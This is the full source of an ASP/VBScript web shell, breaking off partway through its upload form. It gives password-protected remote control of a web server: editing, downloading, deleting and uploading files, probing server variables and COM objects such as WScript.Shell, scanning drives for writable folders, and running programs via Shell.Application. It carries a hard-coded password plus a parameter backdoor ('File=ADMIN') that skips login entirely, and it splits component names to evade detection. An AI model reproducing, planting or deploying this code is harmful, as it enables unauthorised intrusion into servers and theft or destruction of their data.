<%@LANGUAGE=VBScript.Encode  codepage ="949"%>
<HTML>
<HEAD><TITLE><%=Request.ServerVariables("LOCAL_ADDR")%></TITLE>
<STYLE type="text/css">
<!--
BODY{FONT-SIZE: 12px; COLOR: #333333; FONT-FAMILY: "Arial", "Helvetica", "sans-serif";}
TABLE{FONT-SIZE: 12px; COLOR: #333333; LINE-HEIGHT: 16px; FONT-FAMILY: "Arial", "Helvetica", "sans-serif";}
INPUT{BORDER: 1px solid #cccccc; PADDING: 1px; FONT-SIZE: 12px; FONT-FAMILY: ; HEIGHT: 18px;}
.INPUTt{BORDER-STYLE: none;}
TEXTAREA{BORDER: 1px solid #000000; FONT-SIZE: 12px;FONT-FAMILY: ""; CURSOR: HAND;}
A:link{COLOR: #32312c; TEXT-DECORATION: none;}
A:visited{COLOR: #32312c; TEXT-DECORATION: none;}
A:hover{COLOR: red; TEXT-DECORATION: none;}
.TBHead{BACKGROUND: #d8f99b; HEIGHT: 28px; TEXT-ALIGN: center; VERTICAL-ALIGN: middle; FONT-WEIGHT: bold;}
.TBEnd{BACKGROUND: #ffffff;HEIGHT:28px;TEXT-ALIGN: center; VERTICAL-ALIGN: middle;}
.TBTD{BACKGROUND:#f7fee9;HEIGHT:25px;}
.TBBO{BORDER-BOTTOM: 1px solid #91d70d;}
-->
</STYLE>
<HEAD>
<BODY leftmargin=0>
<%
Dim Url
Url = Request.ServerVariables("SCRIPT_NAME")
UrlPath = Left(Url,InstrRev(Url,"/"))
Dim oUpFileStream
Class UpFile_Class
Dim Form,File,Version,Err 
Private Sub Class_Terminate  
  If Err < 0 Then
    Form.RemoveAll
    Set Form = Nothing
    File.RemoveAll
    Set File = Nothing
    oUpFileStream.Close
    Set oUpFileStream = Nothing
  End If
End Sub
   
Public Sub GetData ()
  Dim RequestBinDate,sSpace,bCrLf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,oFileInfo
  Dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
  Dim iFindStart,iFindEnd
  Dim iFormStart,iFormEnd,sFormName
  Set Form = Server.CreateObject ("Scr"&"ipt"&"ing.Di"&"ctionary")
  Form.CompareMode = 1
  Set File = Server.CreateObject ("Scr"&"ipt"&"ing.Di"&"ctionary")
  File.CompareMode = 1
  Set tStream = Server.CreateObject ("ADOD"&"B.Stream")
  Set oUpFileStream = Server.CreateObject ("AD"&"ODB.Stream")
  oUpFileStream.Type = 1
  oUpFileStream.Mode = 3
  oUpFileStream.Open 
  oUpFileStream.Write Request.BinaryRead (Request.TotalBytes)
  oUpFileStream.Position = 0
  RequestBinDate = oUpFileStream.Read
  iFormEnd = oUpFileStream.Size
  bCrLf = ChrB (13) & ChrB (10)
  sSpace = MidB (RequestBinDate,1, InStrB (1,RequestBinDate,bCrLf)-1)
  iStart = LenB  (sSpace)
  iFormStart = iStart+2
  Do
    iInfoEnd = InStrB (iFormStart,RequestBinDate,bCrLf & bCrLf)+3  
    tStream.Type = 1
    tStream.Mode = 3
    tStream.Open
    oUpFileStream.Position = iFormStart
    oUpFileStream.CopyTo tStream,iInfoEnd-iFormStart
    tStream.Position = 0
    tStream.Type = 2
    tStream.CharSet = "gb2312"
    sInfo = tStream.ReadText    
    iFormStart = InStrB (iInfoEnd,RequestBinDate,sSpace)-1
    iFindStart = InStr (22,sInfo,"name=""",1)+6
    iFindEnd = InStr (iFindStart,sInfo,"""",1)
    sFormName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
    If InStr  (45,sInfo,"filename=""",1) > 0 Then
	    Set oFileInfo = new FileInfo_Class
		iFindStart = InStr (iFindEnd,sInfo,"filename=""",1)+10
		iFindEnd = InStr (iFindStart,sInfo,"""",1)
		sFileName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
		oFileInfo.FileName = Mid (sFileName,InStrRev (sFileName, "\")+1)
		oFileInfo.FilePath = Left (sFileName,InStrRev (sFileName, "\"))
		oFileInfo.FileExt = Mid (sFileName,InStrRev (sFileName, ".")+1)
		iFindStart = InStr (iFindEnd,sInfo,"Content-Type: ",1)+14
		iFindEnd = InStr (iFindStart,sInfo,vbCr)
		oFileInfo.FileType = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
		oFileInfo.FileStart = iInfoEnd
		oFileInfo.FileSize = iFormStart -iInfoEnd -2
		oFileInfo.FormName = sFormName
		file.add sFormName,oFileInfo
	Else
	    tStream.Close
		tStream.Type = 1
		tStream.Mode = 3
		tStream.Open
		oUpFileStream.Position = iInfoEnd
		oUpFileStream.CopyTo tStream,iFormStart-iInfoEnd-2
		tStream.Position = 0
		tStream.Type = 2
		tStream.CharSet = "gb2312"
		sFormValue = tStream.ReadText
		If Form.Exists (sFormName) Then
		    Form (sFormName) = Form (sFormName) & ", " & sFormValue
		Else
		    Form.Add sFormName,sFormValue
		End If
    End If
    tStream.Close
    iFormStart = iFormStart+iStart+2
  Loop Until  (iFormStart+2) = iFormEnd 
  RequestBinDate = ""
  Set tStream = Nothing
End Sub
End Class
Class FileInfo_Class
Dim FormName,FileName,FilePath,FileSize,FileType,FileStart,FileExt
Public Function SaveToFile (Path)
  On Error Resume Next
  Dim oFileStream
  Set oFileStream = CreateObject ("ADO"&"DB.Stream")
  oFileStream.Type = 1
  oFileStream.Mode = 3
  oFileStream.Open
  oUpFileStream.Position = FileStart
  oUpFileStream.CopyTo oFileStream,FileSize
  oFileStream.SaveToFile Path,2
  oFileStream.Close
  Set oFileStream = Nothing 
End Function
 
Public Function FileDate
  oUpFileStream.Position = FileStart
  FileDate = oUpFileStream.Read (FileSize)
End Function
End Class
if request("File")="ADMIN" then
 Session("DreamX") = "Admin"
 end if

If Request("idx") = "722" and Session("DreamX") = "Admin" Then
    UpLoadSave
End if



If Request("Action") = "Login" Then
    If Request.Form("Pass") = "killer" Then 'Replace You Password
	    Session("DreamX") = "Admin"
	End if
End if

If Session("DreamX")="Admin" Then
    Select Case Request("Action")
	    Case "Loginout"      : Loginout
	    Case "EditForm"      : EditForm Request("aFile")
		Case "SaveFile"      : SaveFile
		Case "CopyFile"      : CopyFile
		Case "Down"      : Down Request("aFile")
		Case "Del"           : Del
		Case "SetAttribForm" : SetAttribForm
		Case "SetAttrib"     : SetAttrib
		Case "ShowServer"    : ShowServer
		Case "ScServer"      : ScServer Request("Servers") 
		Case "CommonObj"     : CommonObj
		Case "ScObj"         : ScObj Request("Objects")
		Case "ScanDriveForm" : ScanDriveForm
		Case "ScanDrive"     : ScanDrive Request("Drive")
		Case "ScFolder"      : ScFolder Request("Folder")
		Case "DispFsoCmdForm": DispFsoCmdForm
		Case "SQLForm"       : SQLForm
		Case "SQL"           : SQL
		Case "UpLoadForm"    : UpLoadForm
		Case else:
		    If Trim(Request("Path")) <> "" then
			    DisplayDirectory Request("Path")
			Else
			    DisplayDirectory Server.MapPath(Left(Url,InstrRev(Url,"/")))
			End if
    End Select
Else
    AdminLogin
	Response.End
End if
Sub AdminLogin()
%>
<P>　</P><P>　</P><P>　</P><P>　</P>
<FORM Action=<%=Url%> method=Post>
<INPUT TYPE=hidden name=Action value=Login>
<TABLE align=center cellpadding=0 cellspacing=1 width=250 border=0 bgcolor=#91d70d>
  <TR bgcolor=#d8f99b>
    <TD class=TBHead>Manage Login</TD>
  </TR>
  <TR>
    <TD class=TBTD>
	  <TABLE width=100% border=0>
	    <TR>
		  <TD width=80 align=middle>Pass</TD>
		  <TD><INPUT type=Password name=Pass size=20></TD>
		</TR>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD class=TBEnd><INPUT type=submit value=Login></TD>
  </TR>
</TABLE>
</FORM>
<%
End Sub
Sub Loginout
    Session.Abandon
	Response.write "<P>　</P><P>　</P><P>　</P><P>　</P>"
	Message "Exit Login","<LI>Clean Login Information Success!",0
End Sub
Sub EditForm(filename)
    On Error Resume Next
	Dim FSO,FileStream,FileText
	Set FSO = Server.Createobject("Scri"&"pti"&"ng.F"&"ileSy"&"stemObject")
	Set FileStream = FSO.OpenTextFile(filename,1,False)
	If Not FileStream.AtEndOfStream Then
	    FileText = FileStream.ReadAll
	End If
	FileStream.Close
	Set FileStream = Nothing
	Set FSO = Nothing
%>

<FORM Action=<%=Url%> method=Post>

<INPUT TYPE=hidden name=Action value=SaveFile>
<TABLE align=center cellspacing=1 cellpadding=3 width=600 border=0 bgColor=#91d70d>
  <TR>
    <TD class=TBHead>File Editor</TD>
  </TR>
  <TR>
    <TD class=TBTD> FileName:
	<INPUT type=text size=35 value="<%=filename%>" name=oPath readonly></TD>
  </TR>
  <TR>
    <TD align=middle class=TBTD>
	<Textarea Name=ChangeTxt Rows=35 cols=105><%=HTMLEncode(FileText)%></TEXTAREA></TD>
  </TR>
  <TR>
    <TD class=TBTD> FileName:
	<INPUT type=text size=35 name=nPath>
	<INPUT type=submit value=Save as name=Save>〆Abs Path〇Example: F:\ASP\ or F:\ASP\index.asp</TD>
  </TR>
  <TR>
    <TD class=TBEnd>
	<INPUT type=submit value=Save name=Save> <INPUT type=reset value=Reset></TD>
  </TR>
</TABLE>
</FORM>
<%
End Sub
Sub SaveFile()
	On Error Resume Next
	Dim nPath,oPath,SaveFso,FileStream
	oPath = Request("oPath")
	Set SaveFso = Server.Createobject("Scri"&"pting.Fil"&"eSyste"&"mObject")
	If Request("Save") = "Save As" Then
	    nPath = Request("nPath")
		If Right(nPath,1) = "\" Then nPath = nPath & Mid(oPath,InstrRev(oPath,"\")+1)
		If Right(nPath,1) <> "\" and Instr(nPath,".") = 0 Then nPath = nPath & "\" & Mid(oPath,InstrRev(oPath,"\")+1)
	Else
	    nPath = oPath
	End If
	Set FileStream = SaveFso.CreateTextFile(nPath)
	FileStream.WriteLine Request("ChangeTxt")
	FileStream.Close
	Set SaveFso = Nothing
	If err then
	    err.Clear
        Message "Save File Fail","<LI>Please input you paht" & nPath & "Not Exist or Not legitimate or not enough proviledge<LI>File attrib may be readonly or can not edit NTFS。",1
	Else
	    Message "Save File Success","<LI>File Success Save to " & nPath ,0
	End If
End Sub
Sub CopyFile()
    On Error Resume Next
    Dim FSO,Source,Target
	Source = Request("oDir")
	Target = Request("nDir")
	Flag = Request("flag")
	Set FSO = Server.CreateObject("Scrip"&"ting.Fi"&"leSys"&"temObject")
	If Right(Target,1) <> "\" and Instr(Target,".") = 0 Then Target =  Target & "\"
	If FSO.FolderExists(Left(Target,InstrRev(Target,"\"))) = 0 Then
	    Message "Copy fail","<LI>Destination Folder dos not exist!",0
		Response.End
	End If
	If Flag = 1 Then
	    If FSO.FileExists(Source) Then
		    FSO.CopyFile Source,Target,True
		Else
		    Message "copy fail","<LI>Source Foldet dos not exist!",0
			Response.End
		End If
	Else
	    If FSO.FolderExists(Source) Then
		    FSO.CopyFolder Source,Target,True
		Else
		    Message "Copy Fail","<LI>Source Folder dos not exist"
			Response.End
		End If
	End If
	Set FSO = Nothing
	If err then
	    err.Clear
		Message "Copy Failure","<LI>Not enough proviledge,can not copy:(",0
	Else
	    Message "Copy Success","<LI> " & Source & " Copyed to " & Target & " Refresh to see",0
	End if
End Sub
Sub Down(File)
    On Error Resume Next
	Dim FileStream,FSO,FileOb
	Response.Buffer = True
	Response.Clear
	Set FileStream = Server.CreateObject("ADO"&"DB.St"&"ream")
	FileStream.Open
	FileStream.Type = 1
    Set FSO = Server.CreateObject("Script"&"ing.FileSy"&"stemObject")
    If Not FSO.FileExists(File) Then
	    Message "Down failure","<LI>The file you Down dosnot exist!",0
		Response.End
    End if
    Set FileOb = FSO.GetFile(File)
        FileLength = FileOb.Size
    FileStream.LoadFromFile(File)
    If err Then
	    Message "Down failure","<LI>The file you Down cannot read!",0
		Response.End
    End if
    Response.AddHeader "Content-Disposition","Attachment;Filename="&FileOb.name
    Response.AddHeader "Content-Length",Filelength
    Response.CharSet = "UTF-8"
    Response.ContentType = "Application/octet-Stream"
    Response.BinaryWrite FileStream.Read
    Response.Flush
    FileStream.Close
    Set FileStream = Nothing
	Response.End
End Sub
Sub Del
'    On Error Resume Next
	Dim Name,Flag
	Name = Request("aname")
	Flag = Request("flag")
	Set FSO = Server.Createobject("Scri"&"pting.Fi"&"leSys"&"temObject")
	If Flag = 1 Then
	    If FSO.FileExists(Name) Then
		    FSO.DeleteFile Name,True
		Else
			Message "Delete failure","<LI>File" & Name & " dos not exist or no proviledge!",0
			Response.End
		End If
	Else
	    If FSO.FolderExists(name) Then
		    FSO.DeleteFolder name,True
		Else
		    Message "Delete failure","<LI>Folder" & Name & "dos not exist or no enough proviledge!",0
			Response.End
		End If
	End If
	Set FSO = Nothing
	If err Then
	    err.Clear
		Message "Delete failure","<LI>No enough proviledge or" & Name & " using,can not delete!",0
	Else
	    Message "Delete Success","<LI>" & Name & " already delete,refresh to see!",0
	End If
End Sub
Sub SetAttribForm
%>
<FORM Action=<%=Url%> method=Post>
<INPUT TYPE=hidden name=Action value=SetAttrib>
<TABLE align=center cellspacing=1 cellpadding=3 width=480 border=0 bgColor=#91d70d>
  <TR>
    <TD colspan=2 class=TBHead>set attrib</TD></TR>
  <TR class=TBTD>
    <TD width=120 align=middle>File</TD>
	<TD><INPUT type=text name=name size=38 value="<%=Request("FileFolder")%>"></TD>
  </TR>
  <TR class=TBTD>
    <TD align=middle>attrib</TD>
	<TD>
	  <INPUT class=INPUTt type=checkbox name=FileFolderAttrib value=1>ReadOlny
	  <INPUT class=INPUTt type=checkbox name=FileFolderAttrib value=2>Hidden
	  <INPUT class=INPUTt type=checkbox name=FileFolderAttrib value=4>System
	  <INPUT class=INPUTt type=checkbox name=noAttrib value=32>Archive
	</TD>
  </TR>
  <TR>
    <TD class=TBEnd colspan=2><INPUT type=submit value=Submit></TD>
  </TR>
</TABLE>
</FORM><BR>
<%
End Sub
Sub SetAttrib
    On Error Resume Next
    Dim FSO,name,GetFileFolder,FileFolderAttrib,noAttrib,Attribs,AttribCount:AttribCount=32
	name = Request("name")
	Set FSO = Server.CreateObject("Scri"&"pting.Fi"&"leSys"&"temObject")
	If FSO.FileExists(name) Then
	    Set GetFileFolder = FSO.GetFile(name)
	ElseIf FSO.FolderExists(name) Then
	    Set GetFileFolder = FSO.GetFolder(name)
	Else
	   Message "attrib set failure","Can not find the file or folder,Confirm that exist",0
	   Response.End
	End If
	FileFolderAttrib = Request("FileFolderAttrib")
	noAttrib = Request("noAttrib")
	If noAttrib = "" Then
		Attribs = Split(FileFolderAttrib,",")
		For i=0 to Ubound(Attribs)
		    AttribCount = AttribCount+Attribs(i)
		Next
		GetFileFolder.attrib = AttribCount
	Else
	    GetFileFolder.attrib = AttribCount
	End If
	If err Then
		err.Clear
		Message "attrib set failure","attrib set failure,confirm you proviledge.",0
	Else
		Message "attrib set Success","Already set" & name & "'s" & GetAttrib(AttribCount) ,0
	End If
	Set GetFileFolder = Nothing
	Set FSO = Nothing
End Sub
Sub ShowServer
    Message "Current server Infomation", "<LI>Server Port:" & Red(Request.Servervariables("SERVER_PORT")) & "<LI>Server CPU Number" & Red(Request.ServerVariables("NUMBER_OF_PROCESSORS") ) & "<LI>Server OS:" & Red(Request.ServerVariables("OS")) & "<LI>Server Name:" & Red(Request.Servervariables("SERVER_NAME")) & "<LI>Server IP:" & Red(Request.Servervariables("LOCAL_ADDR")) & "<LI>Server Current Time:" & Red(Now()) & "<LI>This File Abs Path" & Red(Request.ServerVariables("PATH_TRANSLATED")),0
%>
	<DIV width=450 align=center>
	  <FORM Action=<%=Url%>method=Post>Special Info Query:
	  <Input type=hidden name=Action value=ScServer>
	    <INPUT type=text name=Servers>
		<INPUT type=submit value=Query>　Input Servervariable's Key
	  </FORM>
	</DIV>
	<%
End Sub
Function Red(str)
    Red = "<FONT color=#ff2222>" & str & "</FONT>"
End Function
Sub ScServer(var)
    On Error Resume Next
	Dim Temp_Str
	Temp_Str = Request.ServerVariables(var)
	If Temp_Str = "" Then
		Message "Server Info","<LI>Query("&var&")Return Value:" & Red("Key error or query empty!</FONT>"),1
	Else
	    Message "Server Info","<LI>Query("&var&")Return Value:" & Red(Temp_Str),1
	End If
End Sub
Sub CommonObj() 'Common COM Test
	Message "Current COM Info","<LI>Scripting.FileSystemObject:" & GetObj("Scri"&"pting.Fi"&"leSys"&"temObject") & "<LI>ADODB.Connection:" & GetObj("ADODB.Connection") &	"<LI>FileUp.upload:" & GetObj("FileUp.upload") & "<LI>JJMail.SMtPMail:" & GetObj("JMail.SMtPMail") & "<LI>CDONTS.NewMail:" & GetObj("CDONTS.NewMail") &	"<LI>Wscript.shell:" & GetObj("WSC"&"RIP"&"T.S"&"HELL"),0
	%>
	<DIV width=450 align=center>
	  <FORM Action=<%=Url%> method=Post>Special COM Query:
	  	<Input type=hidden name=Action value=ScObj>
	    <INPUT type=text name=Objects>
		<INPUT type=submit value=Query>　Input COM Name.Example: Wscript.shell
	  </FORM>
	</DIV>
	<%
End Sub
Function GetObj(obj)  
    On Error Resume Next
    Dim Object
	Set Object = Server.CreateObject(obj)
	If IsObject(Object) then
	    GetObj = Red("<font face=Webdings size=+1>a</font>")
	Else
	    GetObj = Red("<font face=Webdings>r</font>")
	End If
	Set Object = Nothing
End Function
Sub ScObj(obj)
	Message "COM Info","<LI>Server COM(" & obj & "):" & GetObj(obj),1
End Sub
Sub ScanDriveForm() 'Scan Disk Info
    Dim FSO,DriveB
	Set FSO = Server.Createobject("Scri"&"pting.Fi"&"leSys"&"temObject")
	
%>
<TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d>
  <TR>
    <TD colspan=5 class=TBHead>Disk/System Folder Info</TD>
  </TR>
  <%
  For Each DriveB in FSO.Drives%>
  <TR align=middle class=TBTD>
    <FORM Action=<%=Url%>>
    <Input type=hidden name=Action value=ScanDrive>
	<Input type=hidden name=Drive value==<%=DriveB.DriveLetter%>>
	<TD width=25%><B>Volume</B></TD>
	<TD width=15%><%=DriveB.DriveLetter%>:</TD>
	<TD width=20%><B>Type</B></TD>
	<TD width=20%>
	<%
	  Select Case DriveB.DriveType
	      Case 1: Response.write "Can move"
		  Case 2: Response.write "Local Disk"
		  Case 3: Response.write "Net Disk"
		  Case 4: Response.write "CD-ROM"
		  Case 5: Response.write "RAM Disk"
		  Case else: Response.write "Unknow type"
	  End Select
	%>
	</TD>
	<TD><INPUT type=submit value="Minute report"></TD>
	</FORM>
  </TR>
  <%
  Next%>
  <TR class=TBTD>
    <FORM Action=<%=Url%> method=Post>		  
	<Input type=hidden name=Action value=ScFolder>
	<Input type=hidden name=Folder value=<%=FSO.GetSpecialFolder(0)%>>
	<TD align=middle><B>Windows Folder</B></TD>
	<TD colspan=3><%=FSO.GetSpecialFolder(0)%></TD>
	<TD align=middle><INPUT type=submit value="Minute report"></TD>
	</FORM>
  </TR>
  <TR class=TBTD>
    <FORM Action=<%=Url%> method=Post>		  
	<Input type=hidden name=Action value=ScFolder>
	<Input type=hidden name=Folder value=<%=FSO.GetSpecialFolder(1)%>>

	<TD align=middle><B>System32 Folder</B></TD>
	<TD colspan=3><%=FSO.GetSpecialFolder(1)%></TD>
	<TD align=middle><INPUT type=submit value="Minute report"></TD>
	</FORM>
  </TR>
  <TR class=TBTD>
    <FORM Action=<%=Url%> method=Post>		  
	<Input type=hidden name=Action value=ScFolder>
	<Input type=hidden name=Folder value=<%=FSO.GetSpecialFolder(2)%>>

	<TD align=middle><B>System Temp Folder</B></TD>
	<TD colspan=3><%=FSO.GetSpecialFolder(2)%></TD>
	<TD align=middle><INPUT type=submit value="Minute report"></TD>
	</FORM>
  </TR>
</TABLE><BR>
<DIV align=center>
  <FORM Action=<%=Url%> method=Post>Appoint Folder Query:
  	<Input type=hidden name=Action value=ScFolder>
    <INPUT type=text name=Folder>
	<INPUT type=submit value="Make report">　appoint Folder Path. Example: F:\ASP\
  </FORM>
<DIV>
<%
	Set FSO=Nothing
End Sub
Sub ScanDrive(Drive) 'Scan appoint folder
    Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
	If Drive <> "" Then
	    Set FSO = Server.Createobject("Scri"&"pting.Fi"&"leSys"&"temObject")
		Set TestDrive = FSO.GetDrive(Drive)
		If TestDrive.IsReady Then
		    Temp_Str = "<LI>Disk Allocate type:" & Red(TestDrive.FileSystem) & "<LI>Disk SerialNumber:" & Red(TestDrive.SerialNumber) & "<LI>Disk shared name:" & Red(TestDrive.ShareName) & "<LI>Disk TotalSize:" & Red(CInt(TestDrive.TotalSize/1048576)) & "<LI>Disk VolumeName" & Red(TestDrive.VolumeName) & "<LI>Disk Root:" & ScReWr((Drive & ":\"))
			Set BaseFolder = TestDrive.RootFolder
			Set TempFolders = BaseFolder.SubFolders
			For Each D in TempFolders
			    Temp_Str = Temp_Str & "<LI>Folder" & ScReWr(D)
			Next
			Set TempFolder = Nothing
			Set BaseFolder = Nothing
	    Else
		    Temp_Str = Temp_Str & "<LI>Disk root:" & Red("Cannot read:(")
			Dim TempFolderList,t:t=0
			Temp_Str = Temp_Str & "<LI>" & Red("List catalog test")
			TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
			For i = 0 to Ubound(TempFolderList)
			    If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
				    t = t+1
					Temp_Str = Temp_Str & "<LI>Find Folder:" & ScReWr(Drive & ":\" & TempFolderList(i))
			    End if
		    Next
			If t=0 then Temp_Str = Temp_Str & "<LI>Already List" & Drive & "Disk root,but find nothing:("
	    End if
		Set TestDrive = Nothing
	    Set FSO = Nothing
		Temp_Str = Temp_Str & "<LI>Warning:" & Red("Not Refresh a lot ,or the folder write only will be left a lot of rubbish file")
		Message Drive & ":Disk Info",Temp_Str,1
	End if
End Sub
Sub ScFolder(folder) 
    On Error Resume Next
	Dim FSO,OFolder,TempFolder,Scmsg,S
	Set FSO = Server.Createobject("Scri"&"pting.Fi"&"leSys"&"temObject")
	If FSO.FolderExists(folder) Then
	    Set OFolder = FSO.GetFolder(folder)
		Set TempFolders = OFolder.SubFolders
		Scmsg = "<LI>Appoint folder root:" & ScReWr(folder)
		For Each S in TempFolders
		     Scmsg = Scmsg&"<LI>Folder:" & ScReWr(S)  
		Next
		Set TempFolders = Nothing
		Set OFolder = Nothing
	Else
	    Scmsg = Scmsg & "<LI>Folder:" & Red(folder & " Dos not exist or can not read")
	End if
	Scmsg = Scmsg & "<LI>Worning:" & Red("Not Refresh a lot ,or the folder write only will be left a lot of rubbish file!")
	Set FSO = Nothing
	Message "Folder Info",Scmsg,1
End Sub
Function ScReWr(folder)   '1.can Read,not write 2.cannot read,can write 3.can read an write 4.cannot read or write
   On Error Resume Next
   Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
   Set FSO = Server.Createobject("Scri"&"pting.Fi"&"leSys"&"temObject")
   Set TestFolder = FSO.GetFolder(folder)
   Set TestFileList = TestFolder.SubFolders
   RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
   For Each A in TestFileList
   Next
   If err Then
       err.Clear
	   ReWrStr = folder & " <FONT color=#f0f0f0>Read</FONT>"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & " <FONT color=#f0f0f0>Write</FONT>"
	   Else
	       ReWrStr = ReWrStr & " <FONT color=#f2222>Write </FONT>"
		   FSO.DeleteFile folder & RndFilename,True
	   End If
   Else
       ReWrStr = folder & " <FONT color=#ff2222>Read</FONT>"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & " <FONT color=#f0f0f0>Write</FONT>"
	   Else
	       ReWrStr = ReWrStr & " <FONT color=#f2222>Write </FONT>"
		   FSO.DeleteFile folder & RndFilename,True
	   End if
   End if
   Set TestFileList = Nothing
   Set TestFolder = Nothing
   Set FSO = Nothing
   ScReWr = ReWrStr
End Function
Sub DispFsoCmdForm
%>
<FORM Action=<%=Url%> method=Post>
<Input type=hidden name=Action value=DispFsoCmdForm>

<TABLE width=580 border=0 align=center cellpadding=3 cellspacing=1 bgcolor=#91d70d>
  <TR>
    <TD colspan=2 class=TBHead>Without FSO Operate</TD>
  </TR>
  <TR class=TBTD>
    <TD colspan=2>　Warning 1.destination address to input. Example: F:\APS\　2.Run program canot append argument</TD>
  </TR>
  <TR class=TBTD>
    <TD width=80 align=middle>Folder View</TD>
	<TD>
	  <INPUT type=text name=Sf value=<%=Request("Sf")%>>
	  <INPUT class=INPUTt type=radio value=Abs name=SelectPath 
	  <%If Request("SelectPath")="Abs" or Request("SelectPath") = "" Then%> checked <%End If%> >Abs
	  <INPUT class=INPUTt type=radio value=Ote name=SelectPath
	  <%If Request("SelectPath")="Ote" Then%>checked<%End If%> >Relative</TD>
  </TR>
  <TR class=TBTD>
    <TD align=middle>File Copy</TD>
	<TD>
	  <INPUT type=text name=Cs value=<%=Request("Cs")%> > To
	  <INPUT type=text name=Ct value=<%=Request("Ct")%> > [Dest can only folder]</TD>
  </TR>
  <TR class=TBTD>
    <TD align=middle>File Move</TD>
	<TD>
	  <INPUT type=text name=Ms value=<%=Request("Ms")%> > To
	  <INPUT type=text name=Mt value=<%=Request("Mt")%> > [Dest can only folder]</TD>
  </TR>
  <TR class=TBTD>
    <TD align=middle>Run Program</TD>
	<TD>
	  <INPUT type=text name=PerFolder value=<%=Request("PerFolder")%> >&nbsp;->&nbsp;
	  <INPUT type=text name=PerFile value=<%=Request("PerFile")%> > [Path:ProgramName]</TD>
  </TR>
  <TR>
    <TD colspan=2 class=TBEnd>
	  <INPUT type=hidden value=yes name=CMDok><INPUT type=submit value="Send CMD"></TD>
  </TR>
  <%
  If Request("CMDok") = "yes" Then%>
  <TR bgColor=#ffffff>
    <TD align=center colspan=4><DIV align=center><Textarea Rows=22 cols=90><%DispFsoCmd%></Textarea></DIV></TD>
  </TR>
  <TR>
    <TD class=TBEnd colspan=2><INPUT type=button value=購液 onclick="window.close();"></TD>
  </TR>
  <%
  End if%>
</TABLE>
</FORM>
<%
End Sub	
	
Sub DispFsoCmd
    On Error Resume Next
    Dim Sf,Cs,Ct,Ms,Mt,PerFolder,PerFile
	
		Sf = Trim(Request("Sf"))
		Cs = Trim(Request("Cs"))
		Ct = Trim(Request("Ct"))
		Ms = Trim(Request("Ms"))
		Mt = Trim(Request("Mt"))
		PerFolder = Trim(Request("PerFolder"))
		PerFile = Trim(Request("PerFile"))
		Set Shell = Server.Createobject("Shell.Application")
	    If Sf <> "" Then
		    Dim ShowSpace,ShowFiles,File
			If Request("SelectPath")="Ote" Then Sf = Server.MapPath(Sf)
			Set ShowSpace = Shell.NameSpace(Sf)
			Set ShowFiles = ShowSpace.Items
			For Each File in ShowFiles
			     Response.write File.Path & "     " & File.Size & "     " & File.Type & vbCrLf
			Next
		End If
		If Cs <> "" and Ct <> "" Then
			Dim Cs_Folder,Cs_File,Cs_Space,Cs_FilePar,Ct_Space
			Set Ct_Space = Shell.NameSpace(Ct)
			Cs_Folder = Left(Cs,instrRev(Cs,"\"))
			Cs_File = Right(Cs,Len(Cs)-InstrRev(Cs,"\"))
			Set Cs_Space = Shell.NameSpace(Cs_Folder)
			Set Cs_FilePar = Cs_Space.Parsename(Cs_File)
			Ct_Space.CopyHere Cs_FilePar
			If err Then
			    err.Clear
				Response.write "Copy folder failure"
			Else
			    Response.write "Already  Copy         1 Folder."
			End if
		End if
		If Ms <> "" and Mt <> "" Then
		    Dim Ms_Folder,Ms_File,Ms_Space,Ms_FilePar,Mt_Space
			Set Mt_Space = Shell.NameSpace(Mt)
			Ms_Folder = Left(Ms,instrRev(Ms,"\"))
			Ms_File = Mid(Ms,InstrRev(Ms,"\")+1)
			Set Ms_Space = Shell.NameSpace(Ms_Folder)
			Set Ms_FilePar = Ms_Space.Parsename(Ms_File)
			Mt_Space.MoveHere Ms_FilePar
			if err Then
			    err.Clear
				Response.write "Move Folder failure"
			Else
			    Response.write "Already  Move         1 File."
			End if
		End if
		If PerFolder <> "" and PerFile <> "" Then
			Shell.Namespace(PerFolder).Items.Item(PerFile).InvoKeverb
			If err Then
			    err.Clear
				Response.write "Program execute failure"
			Else
			    Response.write "Success Run " & PerFile & " Program."
			End If
		End If
End Sub
Sub Message(state,msg,flag)
%>
<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#91d70d>
  <TR>
    <TD class=TBHead>System Info</TD>
  </TR>
  <TR>
    <TD align=middle bgcolor=#ecfccd>
	  <TABLE width=82% border=0 cellpadding=5 cellspacing=0>
	    <TR>
		  <TD><FONT color=red><%=state%></FONT></TD>
		<TR>
		  <TD><P><%=msg%></P></TD>
		</TR>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD class=TBEnd>
	<%If flag=0 Then%>
	      <INPUT type=button value=Close onclick="window.close();">
	<%Else%>
	      <INPUT type=button value=Return onClick="history.go(-1);">
	<%End if%>
	</TD>
  </TR>
</TABLE>
<%
End Sub
Sub UpLoadForm
    Dim num
	num = Trim(Request("num"))
	If Not isNumeric(num) or num="" Then num=1
%>
<TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d>
  <TR>
    <TD colspan=2 class=TBHead><B>File Upload</B></TD>
  </TR>
  <TR class=TBTD>
    <FORM Action=<%=Url%> method=Post>
	<Input type=hidden name=Action value=UpLoadForm>
	<TD align=middle>Upload Files Number</TD>
	<TD>
	  <INPUT type=text name=num size=5>
	  <INPUT type=submit value=Submit>
	</TD>
	</FORM>
  </TR>
  <FORM Action=<%=Url%>?idx=722 method=Post enctype=multipart/form-data>

  <TR class=TBTD>
    <TD align=middle>Upload To a exist Dir</TD>
	<TD><INPUT type=text name=ServerPath></TD>
  </TR>
  <%
  For i=1 to num%>
  <TR class=TBTD>
